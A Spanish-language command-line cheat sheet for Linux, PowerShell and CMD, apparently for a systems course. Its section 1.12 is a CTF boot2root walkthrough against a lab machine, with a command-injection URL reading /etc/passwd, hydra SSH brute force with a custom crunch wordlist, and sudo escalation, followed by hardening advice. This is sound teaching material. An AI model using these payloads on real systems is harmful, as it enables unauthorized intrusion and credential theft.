# PARTE 1 · LINUX

En Linux **todo es un archivo** (dispositivos, directorios, procesos) y el sistema se organiza como un árbol que cuelga de la raíz `/`. **Es sensible a mayúsculas:** `Archivo.txt` ≠ `archivo.txt`.

| Directorio | Qué contiene |
|---|---|
| `/` | La raíz de todo |
| `/bin` `/sbin` | Binarios básicos / de administración |
| `/home` | Carpetas personales de los usuarios |
| `/root` | Carpeta personal del superusuario |
| `/etc` | Archivos de configuración |
| `/var` | Datos variables (logs, colas) |
| `/tmp` | Temporales |
| `/usr` | Aplicaciones y librerías |

El intérprete de comandos (shell) puede ser `bash` (el más común), `zsh` (avanzado, por defecto en Kali) o `sh` (básico, POSIX). Para ver cuál usas: `echo $SHELL`.

## 1.1. Navegar

```bash
pwd                 # print working directory: la ruta absoluta donde estás
cd /home/alumno     # ir a una ruta absoluta (empieza por /)
cd docs             # ruta relativa: a partir de donde estás
cd ..               # subir un nivel
cd ~                # ir a tu carpeta personal ($HOME)
ls                  # listar
ls -l               # listado largo (permisos, dueño, tamaño, fecha)
ls -a               # incluye ocultos (los que empiezan por .)
ls -lh              # tamaños legibles (K, M, G)
ls -la              # largo + ocultos (se combinan las opciones)
tree /etc           # dibuja el árbol de carpetas
```

> **Ruta absoluta vs relativa:** la absoluta empieza en `/` (o en `$HOME`) y funciona desde cualquier sitio; la relativa parte de donde estás (`../docs` sube uno y entra en docs).

## 1.2. Crear, copiar, mover y borrar archivos

```bash
mkdir proyectos                 # crear carpeta
mkdir -p proyectos/linux/bash   # -p crea también los padres que falten
mkdir -p ~/orion/{evidencias,logs,backup}   # crea las tres de golpe (expansión de llaves)
touch notas.txt                 # crea archivo vacío (o actualiza su fecha)
cp archivo.txt copia.txt        # copiar (el original se queda)
cp /etc/hosts backup/           # si el destino es carpeta, mantiene el nombre
mv archivo.txt Descargas/       # mover
mv viejo.txt nuevo.txt          # renombrar (mover en la misma carpeta)
rm archivo.txt                  # borrar archivo (¡sin papelera!)
rmdir carpeta_vacia             # borra carpeta SOLO si está vacía (seguro)
rm -rf carpeta/                 # borra carpeta y todo su contenido (¡peligro!)
```

> **`rmdir` vs `rm -rf`:** `rmdir` solo borra carpetas vacías, así que si te equivocas, falla y no pierdes nada. `rm -rf` arrasa sin preguntar: úsalo con cuidado.

## 1.3. Ver y buscar dentro de archivos

```bash
cat notas.txt              # imprime el archivo entero (para archivos cortos)
head -n 5 registro.log     # primeras 5 líneas
tail -n 10 registro.log    # últimas 10 líneas
tail -f registro.log       # seguimiento EN VIVO (ideal para logs)
more archivo.log           # paginado básico
less archivo.log           # paginado potente: subir/bajar, buscar con / , salir con q
grep -i error registro.log # busca "error" ignorando mayúsculas (-i)
grep -r localhost backup/  # búsqueda recursiva en una carpeta (-r)
grep -c error registro.log # cuenta las líneas que coinciden (-c)
find /home -name "*.txt"   # busca archivos por nombre de forma recursiva
```

> Opciones típicas de `grep`: `-i` (ignora mayúsculas), `-r` (recursivo), `-n` (número de línea), `-c` (cuenta). `find` recibe primero **dónde** buscar y luego el criterio (`-name`).

## 1.4. Redirección y tuberías

| Operador | Qué hace |
|---|---|
| `>` | Manda la salida a un archivo, **sobrescribiendo** |
| `>>` | Manda la salida a un archivo, **añadiendo** al final |
| `|` | Pasa la salida de un comando como **entrada** del siguiente (tubería) |

```bash
whoami > usuario.txt                    # guarda tu usuario (borra lo que hubiera)
date >> usuario.txt                     # añade la fecha al final (no borra)
ls /etc | grep -i ssh                   # lista /etc y se queda solo con lo que tenga "ssh"
grep -i error registro.log | wc -l      # cuenta las líneas con error (wc -l = contar líneas)
ls | grep '\.txt$' > txts.txt           # guarda los nombres de los .txt ( \. = punto, $ = final)
```

> La tubería `|` conecta la **salida estándar (stdout)** de un comando con la **entrada estándar (stdin)** del siguiente. Es la base de encadenar herramientas pequeñas para hacer cosas grandes.

## 1.5. Procesos

```bash
ps aux                 # todos los procesos (a=todos, u=con CPU/mem, x=sin terminal)
ps aux | grep firefox  # filtrar un proceso concreto
top                    # monitor en vivo por consumo de CPU (salir con q)
htop                   # versión interactiva y más cómoda (si está instalada)
kill 1234              # pide al proceso que termine (SIGTERM / 15, educada)
kill -9 1234           # lo fuerza (SIGKILL / 9) — último recurso
sleep 600 &            # lanza un proceso en segundo plano (& al final)
```

> **`kill` normal vs `kill -9`:** `kill 1234` envía SIGTERM, una petición ordenada de cerrar y limpiar. `kill -9` corta en seco; úsalo solo si el proceso no responde.

## 1.6. Sistema, usuarios y paquetes

```bash
whoami                 # quién soy
uname -a               # info del kernel y sistema
which ls               # dónde está un comando
man grep               # manual de un comando (navegar flechas, buscar / , salir q)
whatis ls              # descripción breve
passwd                 # cambiar mi contraseña
sudo apt update        # actualizar el índice de paquetes (no instala nada)
sudo apt install htop  # instalar un paquete
sudo apt remove nano   # desinstalar
sudo shutdown now      # apagar
sudo shutdown -r now   # reiniciar
sudo shutdown +10      # programar apagado en 10 min (se cancela con shutdown -c)
```

> `sudo` ejecuta como superusuario (root). `apt update` solo refresca la lista; para instalar las actualizaciones se usa después `apt upgrade`.

## 1.7. Permisos

```bash
chmod 755 script.sh            # permisos por números
chmod u+x script.sh            # dar ejecución (x) al usuario (u)
sudo chown alumno:alumno f.txt # cambiar propietario (dueño:grupo)
```

> **Los permisos `755`:** cada dígito es un conjunto (dueño / grupo / otros) y suma **r=4, w=2, x=1**. Así `7` = rwx (4+2+1), `5` = r-x (4+1). `755` = el dueño puede todo, los demás leen y ejecutan.

## 1.8. Red

```bash
ip a                 # todas las interfaces y direcciones (abreviado de 'ip address show')
ip -br a             # resumen breve: una línea por interfaz
ip route             # tabla de rutas (la 'default via...' es el router)
ip a show eth0       # solo una interfaz
ping -c 4 google.com # 4 pings y para (sin -c sigue indefinidamente)
```

Escaneo con **Nmap** (Kali):

```bash
nmap -sn 192.168.56.0/24         # ping scan: qué hosts están vivos (sin escanear puertos)
nmap -sV -p 22,80,443 localhost  # escanea esos puertos e intenta detectar servicio y versión
nmap -p- -sV 192.168.56.10       # -p- recorre LOS 65535 puertos
nmap -O 192.168.56.10            # intenta identificar el sistema operativo
```

| Opción | Qué hace |
|---|---|
| `-sn` | Solo descubre hosts, no escanea puertos |
| `-sV` | Detecta servicio y **versión** de cada puerto abierto |
| `-p` | Elige puertos (`-p-` = todos) |
| `-O` | Adivina el sistema operativo |

> **¡Ojo, legal!** Escanea **solo** redes de laboratorio o con autorización expresa. Ni ser admin ni usar `sudo` sustituyen al permiso del dueño de la red.

## 1.9. Scripting en Bash

Un script empieza con el *shebang* `#!/bin/bash` y se le da permiso con `chmod u+x`.

```bash
#!/bin/bash
# Comentario
echo "Mi primer script"
```

### Condicionales

```bash
if [ -f archivo.txt ]; then      # -f: ¿existe el archivo?
  echo "Existe"
else
  echo "No existe"
fi

if [ "$1" -gt 10 ]; then         # $1 = primer argumento; -gt = mayor que
  echo "Mayor que 10"
elif [ "$1" -eq 10 ]; then       # -eq = igual
  echo "Igual a 10"
else
  echo "Menor que 10"
fi
```

> Comparadores numéricos: `-eq` (igual), `-ne` (distinto), `-gt` (mayor), `-ge` (mayor o igual), `-lt` (menor), `-le` (menor o igual). De archivos: `-f` (es archivo), `-d` (es directorio).

### Bucles y funciones

```bash
for i in 1 2 3 4 5; do           # recorrer una lista
  echo "Número $i"
done

for archivo in *.txt; do         # recorrer los .txt de la carpeta
  echo "Archivo: $archivo"
done

contador=1
while [ $contador -le 5 ]; do     # mientras se cumpla la condición
  echo "Contador: $contador"
  ((contador++))
done

case $opcion in                   # según el valor (como un menú)
  1) echo "Opción 1";;
  2) echo "Opción 2";;
  *) echo "No válida";;
esac

function suma() {                 # función con retorno
  echo $(($1 + $2))
}
resultado=$(suma 3 4)             # captura la salida en una variable
echo "Resultado: $resultado"
```

## 1.10. Transferencia segura e integridad (SCP y hashes)

**SCP** copia archivos entre equipos **a través de SSH**, así que ya va cifrado:

```bash
scp informe.txt usuario@192.168.1.10:/home/usuario/envios/   # subir al remoto
scp usuario@192.168.1.10:/home/usuario/envios/remoto .       # bajar (. = carpeta actual)
scp -P 22222 usuario@host:/ruta/archivo .                    # -P elige puerto SSH (P mayúscula)
```

Para comprobar que el archivo no se alteró, su **hash**:

```bash
sha256sum informe.txt > huella.sha256   # calcular y guardar la huella
sha256sum -c huella.sha256              # en el receptor: verificar ("OK" si coincide)
```

> Si cambia un solo bit, el SHA-256 cambia. Es como se demuestra la integridad de una evidencia o de un envío.

## 1.11. Cifrado con GPG

### Simétrico (misma contraseña para cifrar y descifrar)

```bash
gpg --symmetric --cipher-algo AES256 --output informe.cifrado informe.txt   # cifrar
gpg --output informe.txt --decrypt informe.cifrado                          # descifrar
gpgconf --kill gpg-agent    # borra la contraseña cacheada para que vuelva a pedirla
```

### Asimétrico (clave pública para cifrar, privada para descifrar)

```bash
# 1) El receptor genera su par de claves
gpg --quick-generate-key "Receptor rodrigo-5022" default default 1y
gpg --list-keys            # ver claves públicas
gpg --list-secret-keys     # ver claves privadas
gpg --fingerprint          # ver la huella (para verificarla)

# 2) El receptor exporta su clave PÚBLICA
gpg --armor --export "Receptor rodrigo-5022" > clave.asc

# 3) El emisor la verifica e importa
gpg --show-keys --with-fingerprint clave.asc   # ver la huella SIN importar
gpg --import clave.asc

# 4) El emisor cifra con la pública del receptor
gpg --encrypt --recipient "Receptor rodrigo-5022" --output informe.cif informe.txt

# 5) Solo el receptor descifra, con su clave PRIVADA
gpg --output informe.txt --decrypt informe.cif
```

> **Flujo:** el receptor genera claves → exporta su pública → el emisor la importa → cifra con ella → envía por `scp` → el receptor descifra con su privada.
>
> **Dos avisos:** (1) **nunca** compartas la clave privada (respáldala con `gpg --armor --export-secret-keys "nombre" > privada.asc`). (2) Antes de importar una clave pública, **compara su huella** con la que te dé el dueño por otro canal. Si el nombre lleva espacios, va entre comillas.

## 1.12. Caso avanzado: auditoría de un servidor (pentest)

Todo lo anterior junto, contra una máquina de laboratorio (CTF *boot2root*). Fases clásicas: **reconocimiento → explotación → acceso → movimiento lateral → escalada**.

**Fase 1 · Reconocimiento**
```bash
sudo netdiscover -r 192.168.210.0/24   # localizar la IP de la víctima en la red
nmap -p- -sV 192.168.210.120           # escanear LOS 65535 puertos + versiones
```
> `-p-` destapa servicios escondidos en puertos altos (el SSH real estaba en el 22222, no en el 22, que era un cebo).

**Fase 2 · Explotación**
```bash
nc 192.168.210.120 13337     # netcat conecta "a pelo" y lee el banner del servicio
ftp 192.168.210.120          # FTP mal configurado: login anónimo (anonymous, sin pass)
```

**Fase 3 · Enumeración web e inyección de comandos**
```bash
http://victima/robots.txt    # lista rutas que el admin esconde → revela /passwords/
http://victima/cgi-bin/tracertool.cgi?ip=127.0.0.1;cat /etc/passwd   # inyección con ;
```
> **Inyección de comandos:** el CGI esperaba una IP, pero al no validar la entrada, `;cat /etc/passwd` hace que ejecute los dos comandos y suelte la lista de usuarios.

**Fase 4 · Acceso por SSH (credenciales reutilizadas)**
```bash
ssh Summer@192.168.210.120 -p 22222
more FLAG.txt                # 'cat' estaba saboteado; se lee con more/less/tac
```

**Fase 5 · Movimiento lateral (secretos escondidos)**
```bash
scp -P 22222 Summer@victima:/home/Morty/Safe_Password.jpg .   # exfiltrar a Kali
strings Safe_Password.jpg | grep -i pass    # extraer texto del JPG → contraseña del ZIP
unzip journal.txt.zip
```
> **`strings`** saca las cadenas legibles de cualquier archivo (imagen, binario): así se encuentran secretos guardados en texto plano.

**Fase 6 · Escalada a root (OSINT + diccionario + fuerza bruta)**
```bash
crunch 7 7 -t ,%Flesh -o dicc.txt                                  # diccionario a medida
hydra -l RickSanchez -P dicc.txt ssh://192.168.210.120 -s 22222 -t 4  # fuerza bruta
sudo -l        # ver qué puede ejecutar el usuario como root
sudo su        # si puede ejecutar cualquier cosa sin pass → shell de root
```
> **`sudo -l`** revela permisos sudo demasiado amplios: la vía de escalada más común.

**Qué enseña para bastionar:**

| Fallo | Cómo se bastiona |
|---|---|
| Puertos y banners expuestos | Cortafuegos (ufw/iptables), cerrar lo que no se usa |
| FTP anónimo y servicios sin auth | Desactivar login anónimo, quitar backdoors |
| Inyección de comandos en CGI | Validar la entrada, deshabilitar CGI inseguro |
| Contraseñas débiles reutilizadas | Política de contraseñas fuertes, clave SSH |
| Secretos en texto plano | No guardar secretos en claro, mínimo privilegio |
| `sudo` demasiado permisivo | Auditar `/etc/sudoers`, restringir comandos |

# PARTE 2 · POWERSHELL

PowerShell es el intérprete moderno de Windows. **No trabaja con texto, sino con objetos**, lo que cambia cómo se filtra y se encadena. Muchos "comandos Unix" (`ls`, `cat`, `rm`) existen, pero son **alias** de un cmdlet real.

```powershell
Get-Command ls          # muestra qué ejecutas de verdad (Get-ChildItem)
Get-Help Get-ChildItem -Examples   # ayuda con ejemplos
Get-Alias ls            # ver a qué cmdlet apunta un alias
```

> En **ISE**: F5 ejecuta el script entero, F8 la selección. Para tareas de usuarios, firewall o directivas, abre PowerShell **como administrador**.

## 2.1. Navegar

```powershell
Get-Location                       # dónde estoy (alias pwd)
Set-Location C:\Windows            # cambiar de carpeta (alias cd)
Get-ChildItem                      # listar (alias ls / dir)
Get-ChildItem -Force               # incluir ocultos y de sistema
Get-ChildItem -Directory | Sort-Object Name     # solo carpetas, ordenadas
Get-ChildItem -Recurse -Filter *.log -ErrorAction SilentlyContinue  # buscar recursivo
```

> `-Recurse` entra en subcarpetas, `-Force` muestra ocultos, `-ErrorAction SilentlyContinue` evita que un error de permisos rompa el listado.

## 2.2. Crear, copiar, mover y borrar

```powershell
New-Item -ItemType Directory -Path .\Logs
New-Item -ItemType File -Path .\Logs\app.log -Force
Copy-Item .\Logs\app.log .\Logs\app.bak.log
Copy-Item .\Logs -Destination .\Backup -Recurse -Force
Move-Item .\Backup\app.bak.log .\Backup\app_OLD.log -Force
Remove-Item .\Backup -Recurse -Force -WhatIf   # -WhatIf SIMULA: enseña qué haría sin borrar
```

> **`-WhatIf` es tu red de seguridad:** muestra qué pasaría sin ejecutarlo. Ejemplo de borrado seguro y filtrado por fecha:

```powershell
Get-ChildItem C:\Temp -Filter *.tmp -File -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |
  Remove-Item -Force -WhatIf
```

## 2.3. Ver y buscar dentro de archivos

```powershell
Get-Content .\app.log -TotalCount 20     # primeras 20 líneas (head)
Get-Content .\app.log -Tail 50           # últimas 50 (tail)
Get-Content .\app.log -Tail 20 -Wait     # tail -f (en vivo)
Select-String -Path .\app.log -Pattern "error|fail" -AllMatches   # grep con regex
Select-String -Path .\app.log -Pattern "timeout" -Context 2,2     # 2 líneas antes y después
```

> `Select-String` devuelve **objetos**, así que puedes seguir filtrando: `Select-String ... | Group-Object Path | Select-Object Name, Count` cuenta coincidencias por archivo.

## 2.4. Compresión e integridad

```powershell
Compress-Archive -Path .\Logs -DestinationPath .\Logs.zip -Force
Expand-Archive -Path .\Logs.zip -DestinationPath .\Logs_unzip -Force
Get-FileHash .\Logs.zip -Algorithm SHA256       # hash de integridad (como sha256sum)
Get-AuthenticodeSignature .\script.ps1          # firma del script
```

## 2.5. Procesos

```powershell
Get-Process                           # procesos (como objetos)
Get-Process | Sort-Object CPU -Descending       # ordenar por CPU
Get-Process -Id 1234                  # identificar por PID
Stop-Process -Id 1234                 # matar por PID
```

## 2.6. Usuarios y grupos

```powershell
Get-LocalUser | Select-Object Name, Enabled, LastLogon
New-LocalUser -Name "alumno02" -FullName "Alumno 02" -Password (Read-Host "Pass" -AsSecureString)
Disable-LocalUser -Name "alumno02"    # deshabilitar sin borrar
New-LocalGroup -Name "AlumnosSMR" -Description "Prácticas"
Add-LocalGroupMember -Group "AlumnosSMR" -Member "alumno02"
```

> Ventaja sobre CMD: la salida son objetos, así que puedes canalizar a `Select-Object` para mostrar solo los campos que quieras.

## 2.7. Permisos NTFS (ACL)

Windows no usa rwx sino **ACL** (listas de control de acceso). Herramientas: `icacls` (CMD) y `Get-Acl`/`Set-Acl` (PowerShell).

```powershell
icacls C:\Aula\Practicas /grant "AlumnosSMR:(OI)(CI)M"   # dar Modify a un grupo
icacls C:\Aula\Practicas /inheritance:d                  # quitar herencia manteniendo permisos
icacls C:\Aula\Practicas /save C:\acl_backup.txt /t      # exportar permisos
icacls C:\Aula /restore C:\acl_backup.txt                # restaurar permisos

# PowerShell: inspeccionar ACL y detectar permisos amplios
(Get-Acl C:\Aula\Practicas).Access |
  Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
```

> `M` = Modify, `F` = control total. `(OI)(CI)` propaga a archivos (Object Inherit) y subcarpetas (Container Inherit).

## 2.8. Red

```powershell
Get-NetIPAddress                      # direcciones IP
Get-NetAdapter                        # adaptadores
Get-NetRoute                          # tabla de rutas
Resolve-DnsName www.microsoft.com     # resolver DNS (como nslookup/dig)
Test-Connection 1.1.1.1 -Count 4      # ping
Test-NetConnection www.microsoft.com -Port 443   # probar un puerto concreto
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
```

> **Localizar qué proceso ocupa un puerto:** `Get-NetTCPConnection -LocalPort 8080` da el `OwningProcess` (PID) y `Get-Process -Id <PID>` dice qué programa es.

## 2.9. Firewall y directivas

```powershell
Get-NetFirewallProfile | Select-Object Name, Enabled   # estado de los perfiles
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True   # activar firewall

New-NetFirewallRule -DisplayName "Permitir RDP (Privado)" `
  -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Private

# Ejecución de scripts
Get-ExecutionPolicy -List
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
Unblock-File .\script.ps1       # quita la marca de "descargado de Internet" (MOTW)
```

> `RemoteSigned` permite scripts locales sin firmar pero exige firma a los descargados. `gpupdate /force` aplica directivas de grupo; `gpresult /h informe.html` genera el informe.

## 2.10. Scripting en PowerShell

### Condicionales y switch

```powershell
$nota = 6.5
if ($nota -ge 9) { "Sobresaliente" }
elseif ($nota -ge 5) { "Aprobado" }
else { "Suspenso" }

switch -Regex ($ip) {                     # clasificar una IP por regex
  '^10\.'        { "Red privada 10.0.0.0/8" }
  '^192\.168\.'  { "Red privada 192.168.0.0/16" }
  default        { "No es una privada típica" }
}
```

> Operadores: `-eq -ne -gt -ge -lt -le` (números), `-like` (comodines), `-match` (regex), `-contains` (colecciones). El texto no distingue mayúsculas salvo que uses `-ceq` / `-cmatch`.

### Bucles, funciones y errores

```powershell
for ($i = 1; $i -le 20; $i++) {
  "alumno{0:d2}" -f $i            # {0:d2} rellena con ceros: alumno01, alumno02...
}

Get-ChildItem C:\Temp -File | ForEach-Object {   # $_ es el objeto actual de la tubería
  "{0} => {1} bytes" -f $_.Name, $_.Length
}

function Test-Puerto {
  param(
    [Parameter(Mandatory)][string]$Equipo,
    [Parameter(Mandatory)][ValidateRange(1,65535)][int]$Port
  )
  $r = Test-NetConnection -ComputerName $Equipo -Port $Port -WarningAction SilentlyContinue
  [pscustomobject]@{ Equipo=$Equipo; Port=$Port; Abierto=$r.TcpTestSucceeded }
}
Test-Puerto -Equipo "server01" -Port 3389

try   { Get-ChildItem "C:\NoExiste" -ErrorAction Stop }   # Stop convierte el error en excepción
catch { "ERROR: $($_.Exception.Message)" }
finally { "Esto se ejecuta siempre" }
```

> `[ValidateRange(1,65535)]` bloquea puertos imposibles antes de ejecutar. `[pscustomobject]` crea una salida estructurada, perfecta para exportar a CSV.

# PARTE 3 · CMD

CMD es el intérprete clásico de Windows. Sigue siendo útil para compatibilidad y scripts heredados, aunque su salida es **texto** (más frágil de procesar que los objetos de PowerShell).

## 3.1. Sistema e información

```cmd
systeminfo              :: info detallada (hardware, SO, parches, BIOS, red)
systeminfo | find "Memory"   :: filtrar por texto
hostname                :: nombre del equipo
ver                     :: versión de Windows
driverquery /v /fo table     :: controladores instalados
wmic cpu get name       :: consultas avanzadas (en desuso, pero funciona)
```

## 3.2. Archivos y directorios

```cmd
dir                     :: listar
dir /a /s               :: /a incluye ocultos, /s incluye subcarpetas
cd C:\Windows\System32  :: cambiar de carpeta
cd ..                   :: subir un nivel
mkdir C:\proyectos\nuevo    :: crear carpeta (o 'md')
rmdir /s /q C:\proyectos    :: borrar carpeta (/s contenido, /q sin preguntar)
copy archivo.txt D:\backup\ :: copiar
xcopy C:\datos D:\copia /e /h /y    :: copia avanzada (/e subdirs, /h ocultos, /y sin preguntar)
robocopy C:\datos D:\backup /MIR /MT:8   :: copia profesional (espejo, multihilo)
move *.txt C:\textos    :: mover
del /f /q C:\temp\*.log  :: borrar (/f fuerza, /q sin confirmar)
```

> **`robocopy`** es la mejor herramienta de copia: `/MIR` hace copia espejo, `/Z` modo reiniciable, `/MT:n` multihilo.
